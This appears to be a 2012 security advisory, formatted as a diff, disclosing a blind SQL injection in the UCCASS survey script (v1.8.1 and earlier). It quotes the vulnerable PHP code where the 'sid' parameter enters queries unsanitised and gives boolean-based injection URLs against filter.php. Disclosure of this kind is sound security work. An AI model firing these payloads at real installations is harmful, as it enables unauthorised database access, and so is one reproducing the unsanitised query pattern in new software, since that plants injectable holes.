@@ -1,0 +1,91 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+	
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-06-22                              ]
+ #################################################################
+ #  [ UCCASS <= v1.8.1 ]  Blind SQL Injection Vulnerability      #
+ #################################################################
+ #
+ # Script: "The Unit Command Climate Assessment and Survey System (UCCASS) (pronounced yoo-kas)
+ #          is a PHP based survey script that allows you to create online surveys..."
+ #
+ # Vendor:   http://sourceforge.net/projects/uccass/
+ # Download: http://sourceforge.net/projects/uccass/files/latest/download
+ #
+ ################################################################
+ #
+ # [SQL]
+ #
+ # Versions affected: v1.8.1 and previous
+ #
+ # Vuln: http://localhost/uccass/filter.php?sid=-1 or 1=1-- (true)
+ #       http://localhost/uccass/filter.php?sid=-1 or 1=2-- (false)
+ #
+
+   File: ./uccass/filter.php
+   ...cut...
+   <?php
+
+   include('classes/main.class.php');
+   include('classes/results.class.php');                 // 1 definition of filter function
+
+   $survey = new UCCASS_Results;
+
+   echo $survey->com_header("Filter Survey Results");
+
+   echo $survey->filter($_REQUEST['sid']);               // 2 unfiltered $_REQUEST['sid'] var
+
+   echo $survey->com_footer();
+
+   ?>
+   ...cut...
+
+   File: ./uccass/classes/results.class.php ( lines: 441-479 )
+   ...cut...
+   function filter($sid)
+   {
+        $x = 0;
+        $qid_list = '';
+
+        foreach($_REQUEST['select_qid'] as $qid)
+        { $qid_list .= (int)$qid . ','; }
+        $qid_list = substr($qid_list,0,-1);
+
+        $query = "SELECT at.aid, q.qid, q.question, s.survey_text_mode
+                  FROM {$this->CONF['db_tbl_prefix']}answer_types at,
+                  {$this->CONF['db_tbl_prefix']}questions q, {$this->CONF['db_tbl_prefix']}surveys s
+                  WHERE q.aid = at.aid AND q.sid = $sid AND q.qid IN ($qid_list) AND at.type IN ('MM','MS')   // 3 [SQL]
+                  AND q.sid = s.sid
+                  ORDER BY q.page, q.oid";
+        $rs = $this->db->Execute($query);
+
+        $old_aid = '';
+        if($rs === FALSE) { $this->error("Error selecting filter questions: " . $this->db->ErrorMsg()); }
+        if($r = $rs->FetchRow())
+        {
+            do
+            {
+                $question['question'][] = nl2br($this->SfStr->getSafeString($r['question'],$r['survey_text_mode']));
+                $question['encquestion'][] = $this->SfStr->getSafeString($r['question'],SAFE_STRING_TEXT);
+                $question['aid'][] = $r['aid'];
+                $question['qid'][] = $r['qid'];
+                $temp = $this->get_answer_values($r['aid'],BY_AID,$r['survey_text_mode']);
+                $question['value'][] = $temp['value'];
+                $question['avid'][] = $temp['avid'];
+                $x++;
+            }while($r = $rs->FetchRow());
+            $this->smarty->assign("question",$question);
+        }
+        $rs = $this->db->Execute("SELECT MIN(entered) AS mindate,
+                                  MAX(entered) AS maxdate FROM
+                                  {$this->CONF['db_tbl_prefix']}results WHERE sid = $sid");                   // 4 [SQL]
+        if($rs === FALSE) { $this->error("Error selecting min/max survey dates: " . $this->db->ErrorMsg()); }
+        $r = $rs->FetchRow();
+   ...cut...
+
+ ### [ dun / 2012 ] #####################################################
